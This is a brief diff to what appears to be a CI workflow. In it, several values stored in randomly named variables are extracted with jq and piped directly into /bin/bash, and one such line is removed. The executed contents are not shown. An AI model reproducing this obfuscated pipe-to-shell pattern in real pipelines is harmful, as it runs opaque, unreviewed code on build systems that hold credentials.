@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$i636" | jq -r .zzmdc59423 | /bin/bash
           echo $ezvz5167 | jq -r .cvfxe7 | /bin/bash
-          echo $yksns839 | jq -r .l1519 | /bin/bash
           echo $ikhkq48 | jq -r .di309 | /bin/bash
 
       - name: Save output
